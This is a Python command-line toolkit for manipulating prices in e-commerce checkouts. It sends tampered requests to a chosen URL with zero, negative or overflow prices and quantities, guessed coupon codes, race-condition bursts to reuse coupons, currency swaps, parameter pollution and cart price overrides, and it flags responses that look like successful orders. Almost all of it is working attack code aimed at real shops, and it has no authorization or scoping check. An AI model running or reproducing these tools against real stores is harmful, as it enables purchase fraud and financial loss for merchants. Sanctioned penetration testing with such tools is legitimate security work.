#!/usr/bin/env python3
"""
price_manipulator.py — Price manipulation testing toolkit.
Business logic flaw testing for e-commerce checkouts.
"""
import requests
import json
from pathlib import Path
from urllib.parse import urljoin

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'application/json, text/html, */*',
    'Accept-Language': 'en-US,en;q=0.9',
}

class PriceManipulator:
    """Test e-commerce checkouts for price manipulation flaws."""
    
    def __init__(self, session=None):
        self.session = session or requests.Session()
        self.session.headers.update(HEADERS)
        self.findings = []
    
    # ─── CATEGORY 1: PARAMETER TAMPERING ─────────────────────────────────
    
    def test_body_price_tamp(self, url, original_body, price_fields):
        """
        Modify price fields in JSON POST body.
        price_fields: list of keys to tamper with (e.g., ['price', 'amount'])
        """
        results = []
        for field in price_fields:
            if field not in original_body:
                continue
            original_val = original_body[field]
            
            # Test values
            tests = {
                'zero': 0,
                'negative': -1,
                'negative_large': -999999,
                'fractional': 0.01,
                'empty': '',
                'null': None,
                'string': 'free',
                'array': [],
                'original_neg': -float(original_val) if isinstance(original_val, (int, float)) else -1,
                'overflow': 999999999999999999,
            }
            
            for test_name, test_val in tests.items():
                tampered = original_body.copy()
                tampered[field] = test_val
                
                try:
                    r = self.session.post(url, json=tampered, timeout=10)
                    result = {
                        'category': 'body_parameter_tampering',
                        'field': field,
                        'test': test_name,
                        'value': str(test_val),
                        'status': r.status_code,
                        'response_len': len(r.text),
                        'response_snippet': r.text[:200]
                    }
                    results.append(result)
                    
                    # Detect success indicators
                    if r.status_code == 200:
                        success_keywords = ['success', 'confirmed', 'order', 'thank', 'complete', 'paid']
                        if any(k in r.text.lower() for k in success_keywords):
                            result['ALERT'] = 'POTENTIAL SUCCESS'
                            self.findings.append(result)
                except Exception as e:
                    results.append({'field': field, 'test': test_name, 'error': str(e)})
        
        return results
    
    def test_url_param_tamp(self, url, price_params):
        """
        Modify URL query parameters for price.
        price_params: dict of param names to test
        """
        from urllib.parse import urlparse, parse_qs, urlunparse
        
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in price_params:
            if param not in params:
                continue
            
            original = params[param][0]
            tests = {
                'zero': '0',
                'negative': '-1',
                'fractional': '0.01',
                'empty': '',
                'string': 'free',
                'encoded': '%2D1',  # URL-encoded minus
                'double_encoded': '%252D1',
            }
            
            for test_name, test_val in tests.items():
                tampered = params.copy()
                tampered[param] = [test_val]
                
                # Rebuild query
                from urllib.parse import urlencode
                new_query = urlencode(tampered, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                
                try:
                    r = self.session.get(new_url, timeout=10)
                    results.append({
                        'category': 'url_param_tampering',
                        'param': param,
                        'test': test_name,
                        'value': test_val,
                        'url': new_url,
                        'status': r.status_code
                    })
                except Exception as e:
                    results.append({'param': param, 'test': test_name, 'error': str(e)})
        
        return results
    
    # ─── CATEGORY 2: QUANTITY MANIPULATION ────────────────────────────────
    
    def test_quantity_tamp(self, url, body, qty_field='quantity'):
        """Test quantity field for manipulation."""
        results = []
        
        tests = {
            'zero': 0,
            'negative': -1,
            'negative_large': -100,
            'fractional': 0.5,
            'decimal': 1.5,
            'string': 'abc',
            'empty': '',
            'null': None,
            'array': [1, 2, 3],
            'max_int': 2147483647,
            'overflow': 999999999999999999,
        }
        
        for test_name, test_val in tests.items():
            tampered = body.copy()
            tampered[qty_field] = test_val
            
            try:
                r = self.session.post(url, json=tampered, timeout=10)
                results.append({
                    'category': 'quantity_manipulation',
                    'field': qty_field,
                    'test': test_name,
                    'value': str(test_val),
                    'status': r.status_code,
                    'response': r.text[:300]
                })
            except Exception as e:
                results.append({'test': test_name, 'error': str(e)})
        
        return results
    
    # ─── CATEGORY 3: COUPON/DISCOUNT STACKING ─────────────────────────────
    
    def test_coupon_stacking(self, url, body, coupon_field='coupon_code'):
        """Test multiple coupon applications."""
        results = []
        
        tests = ['TEST', 'TEST1', 'TEST2', 'FREE', 'DISCOUNT', 'PROMO', 
                 'null', '[]', '{}', 'true', 'false', 'undefined']
        
        for coupon in tests:
            tampered = body.copy()
            tampered[coupon_field] = coupon
            
            try:
                r = self.session.post(url, json=tampered, timeout=10)
                results.append({
                    'category': 'coupon_manipulation',
                    'coupon': coupon,
                    'status': r.status_code,
                    'response': r.text[:200]
                })
            except Exception as e:
                results.append({'coupon': coupon, 'error': str(e)})
        
        return results
    
    # ─── CATEGORY 4: RACE CONDITION ───────────────────────────────────────
    
    def test_race_condition(self, url, body, num_requests=10):
        """
        Fire multiple simultaneous requests to exploit race conditions.
        Useful for: using same coupon multiple times, limited items, etc.
        """
        import threading
        
        results = [None] * num_requests
        barrier = threading.Barrier(num_requests)
        
        def fire_request(idx):
            barrier.wait()
            try:
                r = self.session.post(url, json=body, timeout=10)
                results[idx] = {'thread': idx, 'status': r.status_code, 'response': r.text[:200]}
            except Exception as e:
                results[idx] = {'thread': idx, 'error': str(e)}
        
        threads = []
        for i in range(num_requests):
            t = threading.Thread(target=fire_request, args=(i,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        return results
    
    # ─── CATEGORY 5: CLIENT-SIDE PRICE MANIPULATION ──────────────────────
    
    def test_client_side_price(self, url, original_price, quantity=1):
        """
        Test if price is calculated client-side and sent to server.
        Modify the price field directly.
        """
        results = []
        
        # Build a modified payload with client-side price
        tests = [
            {'price': 0, 'total': 0},
            {'price': 0.01, 'total': 0.01},
            {'price': -original_price, 'total': -original_price},
            {'price': 'free', 'total': 0},
            {'price': None, 'total': 0},
            {'price': [], 'total': 0},
        ]
        
        for test in tests:
            try:
                r = self.session.post(url, json=test, timeout=10)
                results.append({
                    'category': 'client_side_price',
                    'sent': test,
                    'status': r.status_code,
                    'response': r.text[:300]
                })
            except Exception as e:
                results.append({'test': test, 'error': str(e)})
        
        return results
    
    # ─── CATEGORY 6: CURRENCY MANIPULATION ────────────────────────────────
    
    def test_currency_tamp(self, url, body, currency_field='currency'):
        """Test currency field manipulation."""
        results = []
        
        currencies = ['USD', 'EUR', 'GBP', 'JPY', 'BTC', 'ETH', 
                      'XXX', 'null', '', 'usd', 'USD USD', 
                      'USD%E2%80%8B',  # zero-width space
                      'USDRUB', 'USD\nRUB']
        
        for curr in currencies:
            tampered = body.copy()
            tampered[currency_field] = curr
            
            try:
                r = self.session.post(url, json=tampered, timeout=10)
                results.append({
                    'category': 'currency_manipulation',
                    'currency': curr,
                    'status': r.status_code,
                    'response': r.text[:200]
                })
            except Exception as e:
                results.append({'currency': curr, 'error': str(e)})
        
        return results
    
    # ─── CATEGORY 7: HTTP PARAMETER POLLUTION ─────────────────────────────
    
    def test_hpp(self, url, param, values):
        """
        HTTP Parameter Pollution: send same param multiple ways.
        e.g., ?price=10&price=0 — backend may use last value
        """
        from urllib.parse import urlencode
        
        results = []
        
        # Duplicate in URL
        params = [(param, v) for v in values]
        query = urlencode(params)
        hpp_url = f"{url}?{query}"
        
        try:
            r = self.session.get(hpp_url, timeout=10)
            results.append({
                'category': 'hpp_url',
                'url': hpp_url,
                'status': r.status_code,
                'response': r.text[:200]
            })
        except Exception as e:
            results.append({'error': str(e)})
        
        # Duplicate in body
        body = {param: values}
        try:
            r = self.session.post(url, json=body, timeout=10)
            results.append({
                'category': 'hpp_body',
                'body': body,
                'status': r.status_code,
                'response': r.text[:200]
            })
        except Exception as e:
            results.append({'error': str(e)})
        
        return results
    
    # ─── CATEGORY 8: SESSION/CART MANIPULATION ────────────────────────────
    
    def test_cart_manipulation(self, cart_url, original_items):
        """
        Test cart manipulation: negative quantities, price override, etc.
        """
        results = []
        
        # Test 1: Negative quantity (refund scenario)
        for item in original_items:
            tampered = original_items.copy()
            idx = original_items.index(item)
            if isinstance(tampered[idx], dict):
                tampered[idx]['quantity'] = -abs(tampered[idx].get('quantity', 1))
            
            try:
                r = self.session.post(cart_url, json={'items': tampered}, timeout=10)
                results.append({
                    'category': 'cart_negative_qty',
                    'status': r.status_code,
                    'response': r.text[:300]
                })
            except Exception as e:
                results.append({'error': str(e)})
        
        # Test 2: Price override in cart
        for item in original_items:
            tampered = original_items.copy()
            idx = original_items.index(item)
            if isinstance(tampered[idx], dict):
                tampered[idx]['price'] = 0.01
            
            try:
                r = self.session.post(cart_url, json={'items': tampered}, timeout=10)
                results.append({
                    'category': 'cart_price_override',
                    'status': r.status_code,
                    'response': r.text[:300]
                })
            except Exception as e:
                results.append({'error': str(e)})
        
        return results
    
    # ─── REPORTING ────────────────────────────────────────────────────────
    
    def generate_report(self):
        """Generate findings report."""
        print("\n" + "=" * 70)
        print("PRICE MANIPULATION TEST REPORT")
        print("=" * 70)
        
        if not self.findings:
            print("No critical findings.")
            return
        
        print(f"\nCRITICAL FINDINGS: {len(self.findings)}")
        for f in self.findings:
            print(f"\n  [{f.get('category', '?')}]")
            print(f"  Field: {f.get('field', f.get('param', '?'))}")
            print(f"  Test: {f.get('test', '?')}")
            print(f"  Value: {f.get('value', '?')}")
            print(f"  Status: {f.get('status', '?')}")
            if 'ALERT' in f:
                print(f"  >>> {f['ALERT']} <<<")
        
        print("\n" + "=" * 70)


# ─── CONVENIENCE FUNCTIONS ─────────────────────────────────────────────────

def scan_url_for_forms(url):
    """Quick scan: find all forms and price-related fields."""
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(r.text, 'html.parser')
        
        forms = soup.find_all('form')
        print(f"\nForms on {url}: {len(forms)}")
        for i, form in enumerate(forms):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            inputs = form.find_all('input')
            print(f"\n  Form {i+1}: {method} {action}")
            for inp in inputs:
                name = inp.get('name', '')
                inp_type = inp.get('type', 'text')
                if any(k in name.lower() for k in ['price', 'amount', 'total', 'cost', 'fee', 'discount', 'coupon']):
                    print(f"    !!! PRICE FIELD: {name} ({inp_type})")
                else:
                    print(f"    {name} ({inp_type})")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser(description='Price Manipulation Toolkit')
    p.add_argument('cmd', choices=['scan', 'tamp_body', 'tamp_url', 'tamp_qty', 'race', 'coupon', 'currency', 'hpp'])
    p.add_argument('--url', required=True, help='Target URL')
    p.add_argument('--body', help='JSON body to tamper')
    p.add_argument('--field', default='price', help='Price field name')
    p.add_argument('--param', default='price', help='URL param name')
    p.add_argument('--qty-field', default='quantity', help='Quantity field name')
    p.add_argument('--threads', type=int, default=10, help='Threads for race test')
    args = p.parse_args()
    
    pm = PriceManipulator()
    
    if args.cmd == 'scan':
        scan_url_for_forms(args.url)
    elif args.cmd == 'tamp_body':
        body = json.loads(args.body) if args.body else {}
        pm.test_body_price_tamp(args.url, body, [args.field])
    elif args.cmd == 'tamp_url':
        pm.test_url_param_tamp(args.url, [args.param])
    elif args.cmd == 'tamp_qty':
        body = json.loads(args.body) if args.body else {}
        pm.test_quantity_tamp(args.url, body, args.qty_field)
    elif args.cmd == 'race':
        body = json.loads(args.body) if args.body else {}
        pm.test_race_condition(args.url, body, args.threads)
    elif args.cmd == 'coupon':
        body = json.loads(args.body) if args.body else {}
        pm.test_coupon_stacking(args.url, body)
    elif args.cmd == 'currency':
        body = json.loads(args.body) if args.body else {}
        pm.test_currency_tamp(args.url, body)
    elif args.cmd == 'hpp':
        pm.test_hpp(args.url, args.param, ['10', '0', '-1'])
    
    pm.generate_report()
